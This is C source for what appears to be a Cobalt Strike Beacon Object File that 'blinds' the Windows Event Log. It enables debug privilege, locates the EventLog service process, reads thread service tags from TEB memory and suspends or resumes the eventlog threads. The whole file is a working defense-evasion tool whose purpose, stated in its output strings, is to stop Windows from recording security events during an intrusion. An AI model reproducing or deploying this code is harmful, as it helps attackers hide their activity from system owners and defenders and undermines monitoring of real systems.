#include <windows.h>  
#include <Strsafe.h>
#include <tlhelp32.h>  
#include "blindeventlog.h"
#include "beacon.h"
#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"shell32.lib")



//Code from: https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/Psx/SOURCE/Psx.c
HRESULT BeaconPrintToStreamW(_In_z_ LPCWSTR lpwFormat, ...) {
	HRESULT hr = S_FALSE;
	va_list argList;
	DWORD dwWritten = 0;

	if (g_lpStream <= (LPSTREAM)1) {
		hr = OLE32$CreateStreamOnHGlobal(NULL, TRUE, &g_lpStream);
		if (FAILED(hr)) {
			return hr;
		}
	}

	if (g_lpwPrintBuffer <= (LPWSTR)1) { 
		g_lpwPrintBuffer = (LPWSTR)MSVCRT$calloc(MAX_STRING, sizeof(WCHAR));
		if (g_lpwPrintBuffer == NULL) {
			hr = E_FAIL;
			goto CleanUp;
		}
	}

	va_start(argList, lpwFormat);
	if (!MSVCRT$_vsnwprintf_s(g_lpwPrintBuffer, MAX_STRING, MAX_STRING -1, lpwFormat, argList)) {
		hr = E_FAIL;
		goto CleanUp;
	}

	if (g_lpStream != NULL) {
		if (FAILED(hr = g_lpStream->lpVtbl->Write(g_lpStream, g_lpwPrintBuffer, (ULONG)MSVCRT$wcslen(g_lpwPrintBuffer) * sizeof(WCHAR), &dwWritten))) {
			goto CleanUp;
		}
	}

	hr = S_OK;

CleanUp:

	if (g_lpwPrintBuffer != NULL) {
		MSVCRT$memset(g_lpwPrintBuffer, 0, MAX_STRING * sizeof(WCHAR)); 
	}

	va_end(argList);
	return hr;
}

//Code from: https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/Psx/SOURCE/Psx.c
VOID BeaconOutputStreamW() {
	STATSTG ssStreamData = { 0 };
	SIZE_T cbSize = 0;
	ULONG cbRead = 0;
	LARGE_INTEGER pos;
	LPWSTR lpwOutput = NULL;

	if (FAILED(g_lpStream->lpVtbl->Stat(g_lpStream, &ssStreamData, STATFLAG_NONAME))) {
		return;
	}

	cbSize = ssStreamData.cbSize.LowPart;
	lpwOutput = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbSize + 1);
	if (lpwOutput != NULL) {
		pos.QuadPart = 0;
		if (FAILED(g_lpStream->lpVtbl->Seek(g_lpStream, pos, STREAM_SEEK_SET, NULL))) {
			goto CleanUp;
		}

		if (FAILED(g_lpStream->lpVtbl->Read(g_lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {		
			goto CleanUp;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "%ls", lpwOutput);
	}

CleanUp:
	if (g_lpStream != NULL) {
		g_lpStream->lpVtbl->Release(g_lpStream);
		g_lpStream = NULL;
	}

	if (g_lpwPrintBuffer != NULL) {
		MSVCRT$free(g_lpwPrintBuffer); 
		g_lpwPrintBuffer = NULL;
	}

	if (lpwOutput != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpwOutput);
	}
	return;
}






BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

	/*
	//alternative option if advapi32 isn't getting loaded
	HMODULE hAdvapi32;
    hAdvapi32 = KERNEL32$LoadLibraryA("Advapi32.dll");
    if (hAdvapi32 == NULL) {
        return FALSE;
    }
	
    OpenProcessToken_t pOpenProcessToken = (OpenProcessToken_t)GetProcAddress(hAdvapi32, "OpenProcessToken");
    if (pOpenProcessToken == NULL) {
        return FALSE;
    }
    if (!pOpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;
	*/
	
	if (!Advapi32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;
    if (!Advapi32$LookupPrivilegeValueA(NULL, lpszPrivilege, &luid)) return FALSE; 

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if (!Advapi32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) return FALSE; 
    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED) return FALSE;

    return TRUE;
}


BOOL Eventlog(int action) {
	SERVICE_STATUS_PROCESS svcStatus;
	svcStatus.dwServiceType = 0;
	svcStatus.dwCurrentState = 0;
	svcStatus.dwControlsAccepted = 0;
	svcStatus.dwWin32ExitCode = 0;
	svcStatus.dwServiceSpecificExitCode = 0;
	svcStatus.dwCheckPoint = 0;
	svcStatus.dwWaitHint = 0;
	svcStatus.dwProcessId = 0;
	svcStatus.dwServiceFlags = 0;
	
	DWORD bytesNeeded = 0;
	HANDLE hSvcProc = NULL;
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	THREAD_BASIC_INFORMATION threadBasicInfo;
	PVOID subProcessTag = NULL;
	BOOL bIsWoW64 = FALSE;
	DWORD dwOffset = NULL;
	BOOL result = FALSE;
	
	NtQueryInformationThread_t pNtQueryInformationThread = (NtQueryInformationThread_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationThread");
	I_QueryTagInformation_t pI_QueryTagInformation = (I_QueryTagInformation_t) GetProcAddress(GetModuleHandle("advapi32.dll"), "I_QueryTagInformation");
	
	SC_HANDLE sc = Advapi32$OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	SC_HANDLE svc = Advapi32$OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);

	Advapi32$QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE) &svcStatus, sizeof(svcStatus), &bytesNeeded);
	DWORD svcPID = svcStatus.dwProcessId;
	
	hSvcProc = KERNEL32$OpenProcess(PROCESS_VM_READ, FALSE, svcPID);
	if (hSvcProc == NULL) {
		BeaconPrintf(CALLBACK_ERROR,"[-] Failed to open handle to eventlog process: %d\n", svcPID);
		return result;
	}

	BeaconPrintToStreamW(L"[+] Opened handle to eventlog process: %d\n", svcPID);

	hThreadSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE) return result;
	te32.dwSize = sizeof(THREADENTRY32);
	
	if (!KERNEL32$Thread32First(hThreadSnap, &te32)) {
		KERNEL32$CloseHandle(hThreadSnap);
		return result;
	}
	
	
	do {
		if (te32.th32OwnerProcessID == svcPID) {

			HANDLE hThread = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
			if (hThread == NULL) {
				return result;
			}

			NTSTATUS status = pNtQueryInformationThread(hThread, (THREAD_INFORMATION_CLASS) 0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);

			bIsWoW64 = KERNEL32$IsWow64Process(hSvcProc, &bIsWoW64);
			if (!bIsWoW64)
				dwOffset = 0x1720;
			else
				dwOffset = 0xf60;
			
			KERNEL32$ReadProcessMemory(hSvcProc, ((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset), &subProcessTag, sizeof(subProcessTag), NULL);

			if (!subProcessTag) {
				KERNEL32$CloseHandle(hThread);
				continue;
			}	
				
			SC_SERVICE_TAG_QUERY query = { 0 };
			
			if (pI_QueryTagInformation)	{
				query.processId = (ULONG) svcPID;
				query.serviceTag = (ULONG) subProcessTag;
				query.reserved = 0;
				query.pBuffer = NULL;
				
				pI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &query);

				if (MSVCRT$_wcsicmp((wchar_t *) query.pBuffer, L"eventlog") == 0) {
					if(action == 1 && KERNEL32$SuspendThread(hThread) != -1) {
						BeaconPrintToStreamW(L"[+] Suspended Eventlog thread: %d\n", te32.th32ThreadID);
						result = TRUE;
					}
					else if (action == 2 && KERNEL32$ResumeThread(hThread) != -1) {
						BeaconPrintToStreamW(L"[+] Resumed Eventlog thread: %d\n", te32.th32ThreadID);
						result = TRUE;
					}
					else {
						BeaconPrintToStreamW(L"[-] Failed to change the state of the Eventlog thread: %d\n", te32.th32ThreadID);
						result = FALSE;
					}
				}
			}
			KERNEL32$CloseHandle(hThread);
		}
	} while (KERNEL32$Thread32Next(hThreadSnap, &te32));

	KERNEL32$CloseHandle(hThreadSnap);
	KERNEL32$CloseHandle(hSvcProc);

    return result;
}


int go(char *args, int len) {
	BOOL res = NULL;
	CHAR *action;
	datap parser;
	
	BeaconDataParse(&parser, args, len);
	action = BeaconDataExtract(&parser, NULL);


	if (!SetPrivilege(SE_DEBUG_NAME, ENABLE)) {
		BeaconPrintf(CALLBACK_ERROR, "Not enough privileges to interact with Eventlog.\n");
		return 0;
	}
	if (MSVCRT$strcmp(action, "suspend") == 0) {
		res = Eventlog(1);
	}
	else if (MSVCRT$strcmp(action, "resume") == 0) {
		res = Eventlog(2);
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "Please specify one of the following options: suspend | resume\n");
		return 0;
	}
	
	if(!res) BeaconPrintf(CALLBACK_ERROR, "Failed to blind Eventlog!\n");
	else  {
		BeaconOutputStreamW();
		BeaconPrintf(CALLBACK_OUTPUT, "[+] DONE");
	}
	
	return 0;
}
